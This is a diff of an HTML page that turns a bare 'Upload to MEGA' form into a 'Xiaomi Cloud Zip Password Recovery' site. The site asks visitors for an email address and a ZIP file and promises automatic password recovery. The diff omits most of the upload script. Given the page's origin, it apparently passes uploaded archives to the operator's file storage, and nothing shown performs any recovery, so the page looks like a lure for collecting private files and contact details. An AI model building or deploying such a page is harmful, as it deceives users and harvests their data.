@@ -1,22 +1,189 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Upload to MEGA</title>
+    <title>Xiaomi Cloud Zip Password Recovery </title>
 </head>
+
 <body>
-    <h1>Upload File to MEGA</h1>
-    <form id="uploadForm">
-        <input type="file" id="fileInput" />
-        <button type="submit">Upload to MEGA</button>
-    </form>
-    <p id="response"></p>
+    <style>
+        * {
+            margin: 0 auto;
+            padding: 0;
+            max-width: 1500px;
+            font-family: 'PingFangSC-Regular', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'STHeiti', 'WenQuanYi Micro Hei', SimSun, sans-serif;
+            /* box-shadow: 0 0 10px rgba(0, 0, 0, 0.603); */
+            /* min-height: 1000px; */
+        }
+
+        body {
+            background-color: #f4f4f4;
+        }
+
+        .navbar {
+            position: sticky;
+            display: flex;
+            flex-direction: row;
+            max-width: 1500px;
+            background-color: black;
+            /* justify-content: space-between; */
+            align-items: center;
+            box-shadow: 0 0 100px rgba(168, 58, 15, 0.973);
+
+        }
+
+
+        .leftnav {
+            display: flex;
+            justify-content: flex-start;
+            /* Ensures the image stays on the left */
+        }
+
+        .leftnav img {
+            max-width: 100px;
+            max-height: 100px;
+            padding: 10px 10px;
+
+        }
+
+        .recover {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+
+        .recover h1 {
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+
+        .recover input[type="email"],
+        .recover input[type="file"] {
+            width: 100%;
+            padding: 10px 10px;
+            margin: 5px 0 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            background-color: #f3f3f3;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            height: 15px;
+            background-color: #4caf50;
+            width: 0;
+            transition: width 0.25s;
+        }
+
+        .recover button {
+            padding: 10px;
+            width: 100%;
+            background-color: #4caf50;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .recover button:hover {
+            background-color: #45a049;
+        }
+
+        .rightnav {
+            color: white;
+            display: flex;
+            justify-content: flex-end;
+            /* Keeps the rightnav content on the right */
+        }
+
+        .mainsection {
+            display: flex;
+            flex-direction: column;
+            /* justify-content: space-between; */
+            min-height: 550px;
+        }
+
+        .steps {
+            color: rgb(0, 0, 0);
+            padding: 10px;
+            margin-top: 50px;
+            margin-bottom: 50px;
+        }
+
+        /* 
+        .recover {
+            display: flex;
+            flex-direction: column;
+        
+        } */
+
+
+        .footerbg {
+            position: sticky;
+            background-color: black;
+        }
+
+        .text-footer {
+            text-align: center;
+            padding: 8px;
+            font-size: medium;
+            font-weight: 100px;
+            font-family: "Cinzel", serif;
+            color: white;
+        }
+    </style>
+    <header class="navbar">
+        <div class="leftnav">
+            <img src="logo1.png" alt="Logo">
+        </div>
+        <div class="rightnav">
+            <h1>Xiaomi Cloud Zip Password Recovery</h1>
+        </div>
+    </header>
+    <section class="mainsection">
+        <section class="steps">
+            <h1>How to Recovery Password on ZIP file</h1>
+            <li>Click inside the file drop area to upload a ZIP file or drag & drop the archive.</li>
+            <li>Enter a valid and working email address.</li>
+            <li>Your password on ZIP file will be recovered automatically.</li>
+        </section>
+        <section class="recover">
+            <h1>Xiaomi Cloud Zip Password Recovery</h1>
+            <form id="uploadForm">
+                <input type="email" id="email" placeholder="Enter your email" required>
+                <input type="file" id="fileInput" accept=".zip" required />
+                <div class="progress-bar" id="progress-bar">
+                    <div class="progress-bar-fill" id="progress-bar-fill"></div>
+                </div>
+                <button type="submit">Recover password</button>
+
+            </form>
+            <p id="response"></p>
+        </section>
+    </section>
+    <footer class="footerbg">
+        <p class="text-footer">
+            Copyright &copy; 2027 Xiaomicloudzippasswordrecovery.com - All Rights Reserved
+        </p>
+
+    </footer>
+
+
 
     <script>
         document.getElementById('uploadForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            
+
             const fileInput = document.getElementById('fileInput');
             const file = fileInput.files[0];
             const responseElement = document.getElementById('response');
@@ -50,4 +217,5 @@
         });
     </script>
 </body>
+
 </html>
